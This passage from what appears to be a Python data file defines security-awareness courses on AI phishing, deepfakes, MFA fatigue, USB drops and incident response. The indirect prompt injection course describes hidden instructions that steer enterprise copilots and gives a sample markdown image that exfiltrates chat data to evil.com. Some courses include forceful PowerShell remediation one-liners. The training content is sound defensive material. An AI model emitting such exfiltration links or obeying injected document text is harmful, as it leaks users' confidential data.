            {"id": "c3", "label": "Purge Rogue Mailbox Rules", "detail": "Delete attacker-injected forwarding rules and delegate mailbox permissions."},
            {"id": "c4", "label": "In-Person MFA Re-Enrollment", "detail": "Re-register hardware MFA keys with verified identity proofing."}
        ],
        ["NIST SP 800-61 Rev 2", "CISA Incident Response Playbook", "ISO/IEC 27001:2022 A.5.25"],
        ["T1078 (Valid Accounts)", "T1098 (Account Manipulation)"],
        "Execute Emergency Remediation PowerShell: `Set-AzureADUser -ObjectId <GUID> -AccountEnabled $false; Revoke-AzureADUserAllRefreshToken -ObjectId <GUID>`."
    )

    # --- TRACK 11: AI-ERA PHISHING & SYNTHETIC THREATS (101 - 110) ---
    add("COURSE-101-AI-ASSISTED-PHISHING", "🤖 AI-Assisted Phishing & LLM Spearphishing Mechanics", "LLM-Generated Spearphishing Triage & Hallucination Spotting SOP", "P2 - HIGH RISK / IDENTITY TARGET",
        "Detect hyper-personalized, grammatically flawless spearphishing emails generated by adversarial Large Language Models (FraudGPT, WormGPT).",
        "SCRUTINIZE SEMANTIC FACTUAL ACCURACY: Look for subtle LLM hallucinations—AI-generated emails often combine accurate company project names with incorrect technical parameters.",
        "INDEPENDENT VERIFICATION OF DETAILS: Validate specific operational claims (e.g. 'Per new Q3 budget policy #892') against official internal documentation.",
        "REPORT AI SPEARPHISHING TO SOC: Forward AI-generated lures to the security team for NLP model feature extraction and threat fingerprinting.",
        "AI DEFENSIVE MAIL FILTERING: Mail gateways employ Natural Language Understanding (NLU) models to detect synthetic text stylometry and intent anomalies.",
        [
            {"id": "c1", "label": "Check Technical Factual Details", "detail": "Verify project names, policy numbers, and deadlines with official intranet records."},
            {"id": "c2", "label": "Do Not Rely on Grammar Errors", "detail": "Modern AI generates perfect spelling; focus on context and sender authenticity."},
            {"id": "c3", "label": "Report to AI Threat Modeling Desk", "detail": "Submit sample for machine learning stylometric analysis."}
        ],
        ["NIST AI Risk Management Framework", "CISA AI Cybersecurity Guidelines", "ISO/IEC 27001:2022 A.8.7"],
        ["T1566.002 (Spearphishing Link)", "T1598 (Social Engineering)"],
        "Forward email sample to ai-threat-telemetry@company.internal for generative model signature analysis."
    )

    add("COURSE-102-AI-WRITTEN-EMAILS", "📝 AI-Written Emails & Grammar Analysis: Why Polished ≠ Safe", "AI Email Syntax & Contextual Semantic Discrepancy Analysis SOP", "P3 - MEDIUM / RECONNAISSANCE",
        "Train personnel to unlearn the outdated assumption that phishing emails always have poor grammar, focusing instead on semantic incongruity.",
        "EVALUATE CONTEXT OVER POLISH: Perfectly written, eloquent prose does NOT equal authenticity; evaluate sender address and request validity.",
        "IDENTIFY AI STYLOMETRIC PATTERNS: Look for characteristic LLM phrases ('I hope this email finds you well', 'Please feel free to reach out', overly structured bullet points).",
        "CROSS-CHECK SENDER STYLISTIC HABITS: Compare the tone with previous authentic emails from the supposed sender—AI emails often sound abnormally formal.",
        "ZERO-TRUST IDENTITY BINDING: Authenticity is established exclusively through cryptographic signatures (S/MIME, DKIM) and out-of-band verification.",
        [
            {"id": "c1", "label": "Polished English ≠ Legitimate", "detail": "Do not lower your guard simply because an email has flawless grammar."},
            {"id": "c2", "label": "Compare Sender's Typical Tone", "detail": "Spot sudden shifts from casual coworker chat to hyper-formal AI phrasing."},
            {"id": "c3", "label": "Rely on Domain Verification", "detail": "Verify sender domain and authentication headers regardless of email polish."}
        ],
        ["NIST SP 800-53 AT-2", "CISA Cross-Sector CPGs", "ISO/IEC 27001:2022 A.6.3"],
        ["T1566 (Phishing)", "T1598 (Social Engineering)"],
        "Dispatch suspected AI-generated email to phishing-analysis@company.internal."
    )

    add("COURSE-103-AUTOMATED-OSINT-PROFILING", "🕵️ Automated OSINT Profiling & Hyper-Targeted Pretexts", "AI Web Scraping Disruption & Corporate Profile Sanitization SOP", "P4 - OPERATIONAL HYGIENE",
        "Counter automated AI scraping tools that aggregate employee LinkedIn, GitHub, and corporate press releases to generate automated spearphishing dossiers.",
        "MINIMIZE PUBLIC OSINT DATA POINTS: Redact personal mobile numbers, home addresses, and family member tags from public social profiles.",
        "SCRUB CORPORATE DIRECTORY LEAKS: Ensure internal org charts, direct phone extensions, and manager-subordinate hierarchies are behind VPN authentication.",
        "REGULAR PROFILE AUDITING: Conduct quarterly personal OSINT audits using search engines to locate and remove leaked employee credentials.",
        "DATA BROKER OPT-OUT AUTOMATION: Enterprise privacy management platforms automatically issue removal requests to consumer data broker registries.",
        [
            {"id": "c1", "label": "Sanitize Public LinkedIn Details", "detail": "Avoid listing specific internal software versions or org reporting chains."},
            {"id": "c2", "label": "Audit Exposed Personal Data", "detail": "Search your name and corporate email on public breach search engines."},
            {"id": "c3", "label": "Report Corporate Directory Leaks", "detail": "Notify security if internal phone trees are found indexed on public websites."}
        ],
        ["NIST SP 800-53 RA-3", "CISA Personal Cybersecurity Best Practices", "ISO 27001:2022 A.8.1"],
        ["T1593 (Search Open Websites)", "T1589 (Gather Victim Identity Info)"],
        "Submit data takedown requests via corporate privacy portal: `privacy.internal/optout`."
    )

    add("COURSE-104-SYNTHETIC-PERSONAS-BOTS", "👤 AI Impersonation & Synthetic Attacker Personas", "Synthetic Attacker Persona Triage & Turing Challenge SOP", "P2 - HIGH RISK / IDENTITY TARGET",
        "Identify synthetic attacker personas on LinkedIn, Slack, and email designed by AI agents to conduct social engineering reconnaissance.",
        "INSPECT PROFILE CREATION HISTORY: Look for recently created accounts with generic work histories, missing mutual connections, and stock bio summaries.",
        "ANALYZE AVATAR ARTIFACTS: Check profile photos for StyleGAN artifacts (asymmetric glasses, blurred earlobes, centered pupil alignment).",
        "CHALLENGE WITH NON-LINEAR CONVERSATION: Introduce unexpected conversational interruptions or ask about localized, physical company landmarks.",
        "ENTERPRISE LINKEDIN / SLACK AUTHENTICATION: Enforce verified company domain credentials for internal communication workspaces.",
        [
            {"id": "c1", "label": "Spot GAN Profile Pictures", "detail": "Look for centered pupils, distorted ear accessories, and blurred background textures."},
            {"id": "c2", "label": "Verify Mutual Connections", "detail": "Confirm recruiter or partner identity through trusted real-world mutual colleagues."},
            {"id": "c3", "label": "Test with Real-World Context", "detail": "Ask specific questions about physical office locations or shared past events."}
        ],
        ["NIST AI RMF", "CISA Synthetic Media Guidance", "ISO 27001:2022 A.6.3"],
        ["T1598 (Social Engineering)", "T1589 (Gather Victim Identity Info)"],
        "Report synthetic social profiles to corporate-brand-protection@company.internal."
    )

    add("COURSE-105-ACOUSTIC-SPECTRAL-ANALYSIS", "🔊 Acoustic Spectral Analysis & AI Audio Clones", "AI Voice Spectrogram Jitter & Harmonic Inconsistency SOP", "P2 - HIGH RISK / IDENTITY TARGET",
        "Understand acoustic spectrogram frequency analysis and recognize synthetic vocoder artifacts in fraudulent voice communications.",
        "LISTEN FOR HIGH-FREQUENCY CUTOFFS: AI voice synthesis models often exhibit unnatural frequency roll-offs above 8kHz and robotic harmonic jitter.",
        "IDENTIFY ARTIFICIAL REVERBERATION: Spot mismatches between room acoustics (e.g. caller claims to be at an airport but voice has studio reverb).",
        "ENFORCE ASYMMETRIC VERIFICATION: When vocal synthesis is suspected, immediately transfer to a secondary video or text verification channel.",
        "TELEPHONY REAL-TIME DSP FILTERS: Enterprise telecom infrastructure applies digital signal processing (DSP) filters to flag vocoder spectral artifacts.",
        [
            {"id": "c1", "label": "Spot High-Frequency Spectral Cutoffs", "detail": "Identify metallic pitch timbre and artificial frequency roll-offs."},
            {"id": "c2", "label": "Detect Background Noise Mismatches", "detail": "Check if ambient room sounds match the caller's stated location."},
            {"id": "c3", "label": "Switch to Secondary Channel", "detail": "Transition high-risk phone conversations to authenticated video calls."}
        ],
        ["IEEE Audio Forensics Standards", "NIST AI Risk Management Framework", "CISA Vishing Advisory"],
        ["T1598.003 (Spearphishing Voice)", "T1566 (Phishing)"],
        "Upload audio recording to voice-forensics-lab.internal for spectrogram Fourier transform analysis."
    )

    add("COURSE-106-SYNTHETIC-IDENTITY-LINKEDIN", "💼 Synthetic Identity & Fictitious Recruiter Profiles", "GAN Face Glitch & Recruiter Identity Verification SOP", "P3 - MEDIUM / RECONNAISSANCE",
        "Defend employees against fictitious recruiter personas and fake job offers on LinkedIn used to deliver malware payloads in interview documents.",
        "NEVER DOWNLOAD ATTACHED 'JOB SPECIFICATIONS': Treat `.zip`, `.exe`, or macro-enabled `.docm` files sent by recruiters on LinkedIn as malware droppers.",
        "INDEPENDENT RECRUITER VERIFICATION: Open the official corporate careers page of the recruiting company to verify the job opening and recruiter name.",
        "USE AIR-GAPPED PERSONAL BROWSING FOR INTERVIEWS: Conduct personal career activities strictly on personal non-corporate devices.",
        "ENTERPRISE WEB ISOLATION: Managed browsers enforce remote browser isolation (RBI) on unclassified social media and career portal links.",
        [
            {"id": "c1", "label": "Zero Execution of Recruiter Files", "detail": "Never run executable files or enable macros in candidate assessment packs."},
            {"id": "c2", "label": "Verify Recruiter on Official Site", "detail": "Cross-reference recruiter identity with official company directory."},
            {"id": "c3", "label": "Keep Personal Search Off Work Laptops", "detail": "Avoid downloading personal career files onto corporate-managed endpoints."}
        ],
        ["NIST SP 800-53 SI-3", "CISA Social Media Security Guide", "ISO 27001:2022 A.8.7"],
        ["T1566.002 (Spearphishing Link)", "T1204.002 (User Execution)"],
        "Report malicious recruiter profiles to LinkedIn Trust & Safety and internal SOC."
    )

    add("COURSE-107-ADAPTIVE-CONVERSATIONAL-BOTS", "💬 Adaptive AI Conversational Attacker Bots", "Adaptive Multi-Turn Chatbot Defense & Context Interruption SOP", "P2 - HIGH RISK / IDENTITY TARGET",
        "Identify automated multi-turn conversational bots that dynamically adapt arguments, answer questions, and simulate human empathy during smishing/chat attacks.",
        "DETECT RAPID PERFECT REPLIES: Spot messaging threads where responses arrive with superhuman speed and perfect grammatical structure.",
        "EXECUTE CONTEXT BREAKING CHALLENGES: Send non-sequitur questions (e.g. 'Can you summarize that in 3 words starting with letter B?') to break bot conversation logic.",
        "HALT INTERACTION IMMEDIATELY: Once automated bot patterns are identified, terminate the chat session and block the sender.",
        "CHATBOT CONVERSATIONAL ANOMALY DETECTION: Security gateways monitor chat interaction velocity and flag repetitive conversational token patterns.",
        [
            {"id": "c1", "label": "Spot Superhuman Reply Speed", "detail": "Identify multi-paragraph replies arriving within milliseconds of your text."},
            {"id": "c2", "label": "Introduce Logical Interruptions", "detail": "Ask illogical or creative questions that derail scripted bot reasoning."},
            {"id": "c3", "label": "Terminate and Block", "detail": "End the messaging thread immediately upon confirming automated interaction."}
        ],
        ["OWASP Top 10 for LLMs", "NIST AI RMF", "CISA Generative AI Framework"],
        ["T1598 (Social Engineering)", "T1566 (Phishing)"],
        "Export chat conversation history and submit to ai-threat-triage@company.internal."
    )

    add("COURSE-108-DEEPFAKE-VIDEO-ARTIFACTS", "🎭 Deepfake Video Artifacts & Glitch Recognition", "Real-Time Video Glitch & Lighting Discontinuity Analysis SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Spot visual rendering anomalies in video deepfakes including lighting inconsistencies, missing specular reflections in eyes, and boundary blurring.",
        "CHECK EYE PUPIL REFLECTIONS: Natural eyes reflect room lighting sources (windows, lamps); deepfake avatars often have mismatched specular reflections.",
        "LOOK FOR BOUNDARY BLURRING DURING RAPID MOVEMENT: When the person moves their hands or turns their head, watch for warping around face borders.",
        "CHALLENGE WITH FACIAL OCCLUSION: Ask the speaker to hold a pen or paper in front of their mouth while speaking to break neural face tracking.",
        "VIDEO INTEGRITY VERIFICATION: Enterprise video systems verify frame-level digital signatures and analyze optical flow vectors.",
        [
            {"id": "c1", "label": "Inspect Pupil Specular Reflections", "detail": "Check for consistent light source reflections across both eyes."},
            {"id": "c2", "label": "Test with Facial Occlusion", "detail": "Ask the speaker to pass their hand or a physical object across their face."},
            {"id": "c3", "label": "Look for Edge Warping", "detail": "Watch for blurring and pixel tearing near the jawline and collar."}
        ],
        ["NIST AI RMF", "DARPA MediFor (Media Forensics) Guidelines", "ISO 27001:2022 A.8.12"],
        ["T1598 (Social Engineering)", "T1566 (Phishing)"],
        "Report video conference impersonation attempt to executive-protection@company.internal."
    )

    add("COURSE-109-INDIRECT-PROMPT-INJECTION", "🛡️ Indirect AI Prompt Injection into Enterprise Copilots", "Enterprise Copilot Indirect Prompt Injection Neutralization SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Defend Enterprise AI Copilots (Microsoft 365 Copilot, Google Gemini for Workspace) against indirect prompt injections hidden in external emails and documents.",
        "RECOGNIZE SYSTEM OVERRIDE ATTEMPTS: Identify documents that contain text instructions attempting to dictate how AI assistants format or transmit summaries.",
        "NEVER EXECUTE UNVERIFIED COPILOT LINKS: If an AI copilot summary contains a hyperlink requesting you to 'Click to approve action', verify the destination root domain.",
        "STRIP UNTRUSTED MARKDOWN IMAGES: Do not allow AI tools to render external markdown images (`![img](https://evil.com/exfil?data=...)`) which leak confidential chat data.",
        "COPILOT ISOLATION & EGRESS FILTERING: Enterprise AI infrastructure sandboxes document processing and enforces strict egress network firewalls.",
        [
            {"id": "c1", "label": "Inspect External Document Text", "detail": "Check for hidden system prompt overrides in vendor PDFs and spreadsheets."},
            {"id": "c2", "label": "Verify AI Generated Links", "detail": "Scrutinize hyperlinks generated inside AI summary responses before clicking."},
            {"id": "c3", "label": "Block External Image Renders", "detail": "Prevent AI tools from executing external markdown image GET requests."}
        ],
        ["OWASP Top 10 for LLMs (LLM01)", "NIST SP 800-53 SC-7", "CISA AI Cybersecurity Roadmap"],
        ["T1059 (Command and Scripting Interpreter)", "T1567 (Exfiltration Over Web Service)"],
        "Submit prompt injection sample to ai-redteam@company.internal for model firewall rule tuning."
    )

    add("COURSE-110-MULTI-MODAL-AI-CRUCIBLE", "⚡ Multi-Modal AI Attack Simulation Crucible", "Unified Multi-Modal AI Attack Defense (Audio + Video + Text) SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Master cross-modal defense against synchronized AI attacks combining synthetic video conferences, generative voice calls, and automated phishing emails.",
        "UNIVERSAL MULTI-MODAL DEFENSE POSTURE: Maintain complete procedural skepticism regardless of whether an attack arrives via audio, video, text, or all three.",
        "ENFORCE ASYMMETRIC OUT-OF-BAND PROTOCOLS: Rely exclusively on pre-shared cryptographic tokens, physical corporate directory callbacks, and in-person authorizations.",
        "ISOLATE HIGH-VALUE TRANSACTIONS: High-risk financial and identity operations must be performed inside dedicated, multi-party approval systems.",
        "UNIFIED THREAT CORRELATION (XDR): SOC analysts utilize unified XDR correlation to detect cross-modal attack campaigns across all enterprise communication channels.",
        [
            {"id": "c1", "label": "Universal Cross-Modal Skepticism", "detail": "Do not let synchronized video, audio, and email overwhelm procedural rigor."},
            {"id": "c2", "label": "Enforce Offline Challenge Codes", "detail": "Require pre-registered cryptographic duress words for high-stakes actions."},
            {"id": "c3", "label": "Multi-Party Portal Approval", "detail": "Execute wire releases and access grants strictly inside dual-signoff portals."}
        ],
        ["NIST CSF 2.0 PR.AT-01", "NIST AI RMF", "ISO/IEC 27001:2022 A.5.25"],
        ["T1566 (Phishing)", "T1598 (Social Engineering)"],
        "Initiate Enterprise P1 Security Incident for Coordinated Multi-Modal Threat Campaign."
    )

    # --- TRACK 12: SECURITY RESPONSE & ADVANCED BEHAVIOR (111 - 120) ---
    add("COURSE-111-60-SECOND-INCIDENT-REPORT", "🚨 60-Second Incident Reporting Protocol", "Rapid Security Incident Escalation & RFC Header Forwarding SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Execute rapid incident reporting within 60 seconds of spotting a suspicious email, preserving RFC-822 header telemetry to enable tenant-wide message purges.",
        "DO NOT DELETE SUSPICIOUS EMAILS: Preserve the message in your inbox so the original email headers, return paths, and routing hops can be extracted.",
        "FORWARD AS RFC-822 ATTACHMENT: In Outlook, press Ctrl+Alt+F to forward the email as an attachment (or click 'Report Phishing' button).",
        "INCLUDE OBSERVED RED FLAGS: Briefly state why the message was flagged (e.g. 'Mismatched domain', 'Urgent wire request').",
        "AUTOMATED GATEWAY REMEDIATION: SOAR automation queries Microsoft Graph API and deletes identical messages from all employee mailboxes within 90 seconds.",
        [
            {"id": "c1", "label": "Preserve Original Headers", "detail": "Forward email as an .eml/.msg attachment to retain full routing headers."},
            {"id": "c2", "label": "Report Within 60 Seconds", "detail": "Rapid submission stops coworkers from clicking the same phishing wave."},
            {"id": "c3", "label": "Use 1-Click Phish Alarm", "detail": "Trigger automated SOC sandbox analysis and tenant-wide email purge."}
        ],
        ["NIST SP 800-61 Rev 2 Section 3", "CISA Incident Handling Guide", "ISO 27001:2022 A.5.25"],
        ["T1566 (Phishing)", "M1017 (User Training)"],
        "Forward email as attachment to phish-triage@company.internal or click Phish Alarm button."
    )

    add("COURSE-112-POST-CLICK-ISOLATION", "🔌 Post-Click Response & Network Isolation Procedures", "Post-Click Host Network Isolation & EDR Quarantine SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Execute immediate endpoint isolation protocols following an accidental malware execution to prevent lateral network movement and C2 beaconing.",
        "STEP 1 - PULL PHYSICAL NETWORK CABLE: Immediately unplug Ethernet cable from laptop or docking station.",
        "STEP 2 - DISABLE WIRELESS ADAPTER: Toggle physical Wi-Fi switch off or turn on Airplane Mode in operating system settings.",
        "STEP 3 - DO NOT POWER OFF LAPTOP: Leave the computer running so volatile RAM memory and process forensic artifacts are preserved for SOC investigators.",
        "STEP 4 - CONTACT SOC FROM SECONDARY DEVICE: Call the Emergency Incident Hotline from your mobile phone to initiate EDR network isolation.",
        [
            {"id": "c1", "label": "Disconnect Ethernet & Wi-Fi", "detail": "Sever local network connections immediately to block lateral movement."},
            {"id": "c2", "label": "Leave Computer Powered On", "detail": "Do not shut down or reboot; volatile RAM is essential for malware forensics."},
            {"id": "c3", "label": "Call SOC from Mobile Phone", "detail": "Notify incident response team from an independent secondary device."}
        ],
        ["NIST SP 800-61 Rev 2 Section 3.3 (Containment)", "CISA CPG 2.B", "ISO 27001:2022 A.8.7"],
        ["T1059 (Command and Scripting Interpreter)", "T1046 (Network Service Discovery)"],
        "Execute PowerShell: `Disable-NetAdapter -Name * -Confirm:$false` and call SOC Rapid Incident Line: Ext #911."
    )

    add("COURSE-113-POST-ATTACHMENT-FORENSICS", "🔬 Post-Attachment Execution Forensics & Process Kill", "Post-Attachment Detonation & Suspicious Child Process Kill SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Identify and terminate rogue child processes (cmd.exe, powershell.exe, wscript.exe) spawned by weaponized document attachments.",
        "OPEN TASK MANAGER / PROCESS EXPLORER: Press Ctrl+Shift+Esc to view active background processes.",
        "IDENTIFY SUSPICIOUS CHILD PROCESSES: Look for Word or Excel spawning background command-line interpreters (`powershell.exe`, `cmd.exe`, `mshta.exe`, `rundll32.exe`).",
        "TERMINATE SUSPICIOUS PROCESS TREE: Right-click the suspicious process and select 'End Process Tree' to halt active script execution.",
        "DISPATCH EDR THREAT REPORT: Notify SOC to collect full memory dumps and initiate endpoint disk forensic imaging.",
        [
            {"id": "c1", "label": "Inspect Process Trees", "detail": "Check Task Manager for unexpected command shells running under Office apps."},
            {"id": "c2", "label": "Kill Rogue Process Trees", "detail": "Terminate suspicious executable trees immediately to stop payload staging."},
            {"id": "c3", "label": "Preserve Memory Dump", "detail": "Allow SOC forensic tools to capture volatile RAM before rebooting."}
        ],
        ["NIST SP 800-61 Rev 2", "CISA Endpoint Security Best Practices", "CIS Control 10.5"],
        ["T1204.002 (User Execution: Malicious File)", "T1059.001 (PowerShell)"],
        "Execute command: `Get-Process | Where-Object {$_.Path -match 'AppData|Temp'} | Stop-Process -Force`."
    )

    add("COURSE-114-POST-CREDENTIAL-DISCLOSURE", "🔑 Post-Credential Disclosure Token Revocation", "Post-Disclosure Password Invalidation & Active Session Revocation SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Execute emergency password rotation and session token revocation within 3 minutes of entering credentials on a suspected phishing portal.",
        "STEP 1 - CHANGE PASSWORD IMMEDIATELY: Navigate to your bookmarked enterprise identity portal (identity.company.internal) and change your password.",
        "STEP 2 - TRIGGER ACTIVE SESSION REVOCATION: Click 'Sign out of all sessions' in your account security dashboard to kill stolen tokens.",
        "STEP 3 - NOTIFY SOC FOR REFRESH TOKEN KILL: Contact SOC to execute tenant-wide `Revoke-AzureADUserAllRefreshToken` to invalidate ESTSAuth cookies.",
        "STEP 4 - AUDIT SIGN-IN LOGS FOR FOREIGN IPS: Review recent account activity for successful logins originating from unapproved countries.",
        [
            {"id": "c1", "label": "Rotate Password Immediately", "detail": "Change your corporate password via official bookmarked portal within 3 minutes."},
            {"id": "c2", "label": "Sign Out of All Sessions", "detail": "Use Microsoft/Google security dashboard to terminate all active sessions."},
            {"id": "c3", "label": "SOC Refresh Token Kill", "detail": "Request SOC to execute tenant-wide token invalidation via PowerShell."}
        ],
        ["NIST SP 800-63B Section 5.1", "CISA CPG 2.B", "ISO/IEC 27001:2022 A.8.5"],
        ["T1078 (Valid Accounts)", "T1539 (Steal Web Session Cookie)"],
        "Trigger emergency password reset at `identity.company.internal/reset` and call SOC Helpdesk."
    )

    add("COURSE-115-UNEXPECTED-MFA-RESPONSE", "🛡️ Handling Unexpected MFA Push Requests", "MFA Push Fatigue Rejection & 'Deny & Report Fraud' Escalation SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Defend against MFA push fatigue attacks (MFA Bombing) where attackers trigger dozens of push notifications to coerce an accidental approval.",
        "NEVER APPROVE UNEXPECTED MFA PROMPTS: If your phone receives an MFA push notification when you are NOT actively logging in, tap 'DENY'.",
        "TAP 'REPORT FRAUD / NO, IT'S NOT ME': Tapping 'Report Fraud' immediately flags your account in Entra ID and triggers an automated password reset prompt.",
        "CHANGE PASSWORD IMMEDIATELY: Understand that receiving an unexpected MFA prompt means the attacker ALREADY HAS your password.",
        "ENFORCE NUMBER MATCHING: Microsoft Authenticator enforces Number Matching, requiring the user to type a 2-digit number shown on the login screen.",
        [
            {"id": "c1", "label": "Tap Deny and Report Fraud", "detail": "Never tap Approve on MFA notifications you did not personally trigger."},
            {"id": "c2", "label": "Change Password Immediately", "detail": "An MFA prompt indicates your password has already been compromised."},
            {"id": "c3", "label": "Enforce Number Matching", "detail": "Require 2-digit number matching to eliminate blind push approvals."}
        ],
        ["NIST SP 800-63B Section 5.1.3", "CISA Advisory on MFA Fatigue Attacks", "ISO 27001:2022 A.8.5"],
        ["T1621 (Multi-Factor Authentication Request Generation)", "T1078 (Valid Accounts)"],
        "Trigger immediate password change and report MFA push flooding to identity-soc@company.internal."
    )

    add("COURSE-116-INDEPENDENT-CHALLENGE", "📞 Multi-Channel Independent Verification Runbook", "Multi-Channel Out-of-Band Identity Validation Runbook SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Execute structured multi-channel independent verification across email, chat, phone, and video before approving sensitive operational changes.",
        "STEP 1 - IDENTIFY SENSITIVE TRANSACTION: Flag wire transfers, vendor bank changes, employee payroll updates, and elevated role grants.",
        "STEP 2 - SELECT INDEPENDENT SECONDARY CHANNEL: If request arrived via email, verify via phone or video; if request arrived via phone, verify via secure portal.",
        "STEP 3 - USE PRE-VERIFIED CONTACT RECORDS: Lookup the requester in the internal Global Address List or official contract directory—never use message contacts.",
        "STEP 4 - DOCUMENT VERIFICATION AUDIT TRAIL: Log timestamp, channel used, verified contact phone, and approval notes in the operational ticketing system.",
        [
            {"id": "c1", "label": "Identify High-Risk Transactions", "detail": "Enforce mandatory out-of-band verification for all financial and access requests."},
            {"id": "c2", "label": "Use Independent Channel", "detail": "Verify across a secondary communication channel not controlled by the requester."},
            {"id": "c3", "label": "Attach Audit Evidence", "detail": "Record verification callback logs in the official transaction record."}
        ],
        ["NIST SP 800-53 AC-3", "ISO/IEC 27001:2022 A.5.25", "SOX Section 404"],
        ["T1598 (Social Engineering)", "T1566 (Phishing)"],
        "Attach completed Out-of-Band Verification Dossier to ServiceNow change request ticket."
    )

    add("COURSE-117-PHYSICAL-TAILGATING-SECURITY", "🚪 Physical Social Engineering & Tailgating Entry", "Physical Access Control & Tailgating Interruption Protocol", "P4 - OPERATIONAL HYGIENE",
        "Prevent unauthorized physical facility entry by challenging tailgaters, enforcing badging compliance, and reporting unbadged individuals.",
        "ONE BADGE, ONE ENTRY: Ensure every person taps their own RFID access badge at building turnstiles and secure door readers.",
        "POLITELY CHALLENGE UNBADGED PERSONS: State: 'Hello! Company policy requires all visitors to sign in at reception. Let me walk you over to the front desk.'",
        "NEVER HOLD SECURE DOORS OPEN: Do not hold secure server room, executive suite, or data center doors open for unverified individuals carrying boxes.",
        "CCTV & ACCESS CONTROL ALARMING: Building access systems trigger automated alarm events on 'Door Forced Open' and 'Door Held Open' conditions.",
        [
            {"id": "c1", "label": "Every Person Must Badge", "detail": "Do not allow anyone to follow you through secure access turnstiles without badging."},
            {"id": "c2", "label": "Politely Escort to Reception", "detail": "Guide unbadged visitors directly to the front security registration desk."},
            {"id": "c3", "label": "Never Prop Open Secure Doors", "detail": "Keep secure facility doors closed and latched at all times."}
        ],
        ["NIST SP 800-53 PE-2 (Physical Access Control)", "ISO/IEC 27001:2022 A.7.2", "ASIS Physical Security Standards"],
        ["T1078 (Valid Accounts)", "T1200 (Hardware Additions)"],
        "Call Physical Security Desk: Ext #5555 or report tailgating to building-security@company.internal."
    )

    add("COURSE-118-USB-RUBBER-DUCKY-DEFENSE", "💾 USB Drops & BadUSB Removable Media Defense", "Rogue USB Device Handling & BadUSB Physical Quarantine SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Safely handle and quarantine suspicious physical USB drives, BadUSB microcontrollers, and hardware keyloggers found in corporate spaces.",
        "ZERO WORKSTATION INSERTION: Never plug an unknown USB device into any workstation, conference room PC, or personal laptop.",
        "PHYSICAL ISOLATION ENVELOPE: Place the found USB drive in a sealed envelope or anti-static bag without touching metal contacts.",
        "DELIVER TO SOC FORENSICS LAB: Deliver the sealed USB drive directly to the SOC Hardware Forensics Lab for analysis in an air-gapped sandbox.",
        "GROUP POLICY REMOVABLE STORAGE BLOCK: Endpoint policies enforce read/write blocking on USB mass storage devices enterprise-wide.",
        [
            {"id": "c1", "label": "Zero USB Insertion", "detail": "Never test found USB drives to see whose files are on them."},
            {"id": "c2", "label": "Sealed Envelope Quarantine", "detail": "Pick up found USB devices safely and place in sealed envelope."},
            {"id": "c3", "label": "Deliver to SOC Hardware Lab", "detail": "Allow security engineers to dissect firmware inside isolated sandbox."}
        ],
        ["NIST SP 800-53 MP-7", "CISA Removable Media Guide", "CIS Control 10.3"],
        ["T1200 (Hardware Additions)", "T1052.001 (Exfiltration over USB)"],
        "Hand deliver found USB storage devices to SOC Hardware Lab, Room #304."
    )

    add("COURSE-119-CLEAN-DESK-PII-PROTECTION", "📋 Clean Desk, Whiteboard & PII Protection Standards", "Clean Desk, Whiteboard & Customer PII Protection Standards SOP", "P4 - OPERATIONAL HYGIENE",
        "Harden physical office hygiene by securing confidential printouts, erasing conference whiteboards, and enforcing automated workstation screen locks.",
        "LOCK UNATTENDED WORKSTATIONS: Press `Win + L` (Windows) or `Cmd + Ctrl + Q` (Mac) every time you step away from your desk.",
        "SECURE CONFIDENTIAL PRINTOUTS: Collect printed documents from network printers immediately; use Secure Pull Printing requiring badge authentication.",
        "WIPE WHITEBOARDS AFTER MEETINGS: Thoroughly clean all conference room whiteboards containing project roadmaps, API keys, or architectural diagrams.",
        "SECURE SHREDDING OF SENSITIVE DRAFTS: Deposit printed PII and draft contracts into locked DIN 66399 P-4 cross-cut shredding consoles.",
        [
            {"id": "c1", "label": "Lock Screen on Departure", "detail": "Always lock your computer screen when leaving your desk, even for 1 minute."},
            {"id": "c2", "label": "Secure Pull Printing", "detail": "Retrieve printed documents immediately from network multi-function printers."},
            {"id": "c3", "label": "Erase Meeting Whiteboards", "detail": "Wipe conference room whiteboards clean at the end of every session."}
        ],
        ["ISO/IEC 27001:2022 Control A.7.7", "HIPAA 45 CFR §164.310", "GDPR Article 32"],
        ["T1005 (Data from Local System)", "T1552 (Unsecured Credentials)"],
        "Report uncollected sensitive printouts to clean-desk-compliance@company.internal."
    )

    add("COURSE-120-FINAL-MULTI-STAGE-CRUCIBLE", "🏆 Final Multi-Stage Human Risk Defense Crucible", "Master Enterprise Security Champion Cross-Vector Defense SOP", "P1 - CRITICAL / ACTIVE COMPROMISE",
        "Synthesize comprehensive cyber awareness across email, web, SaaS, mobile, voice, physical, and AI vectors to defend the enterprise as an elite Security Champion.",
        "MULTI-LAYERED DEFENSIVE VIGILANCE: Apply continuous zero-trust skepticism across every inbound communication channel.",
        "RIGOROUS PROCEDURAL COMPLIANCE: Enforce standardized out-of-band callbacks, dual authorization, and formal ticketing without exception.",
        "RAPID 60-SECOND INCIDENT REPORTING: Serve as an active human sensor, immediately reporting anomalies to protect coworkers and the enterprise.",
        "CONTINUOUS LIFELONG LEARNING: Regularly review threat intelligence bulletins, participate in threat simulation exercises, and mentor department peers.",
        [
            {"id": "c1", "label": "Zero-Trust Across All Channels", "detail": "Verify identity and authorization across Email, SMS, Voice, Cloud, and Physical access."},
            {"id": "c2", "label": "Strict Out-of-Band Verification", "detail": "Always validate sensitive requests through independent pre-established directories."},
            {"id": "c3", "label": "Rapid SOC Incident Escalation", "detail": "Report suspicious events within 60 seconds to enable automated enterprise containment."},
            {"id": "c4", "label": "Champion Security Culture", "detail": "Encourage and support colleagues in following standard security operating procedures."}
        ],
        ["NIST CSF 2.0 (Govern, Identify, Protect, Detect, Respond, Recover)", "ISO/IEC 27001:2022 A.5.25", "CISA Cross-Sector Cybersecurity Performance Goals"],
        ["T1566 (Phishing)", "T1598 (Social Engineering)", "T1078 (Valid Accounts)"],
        "Congratulations on completing the LockPhish Masterclass Academy! Dispatch certification hash to academy-registry@company.internal."
    )
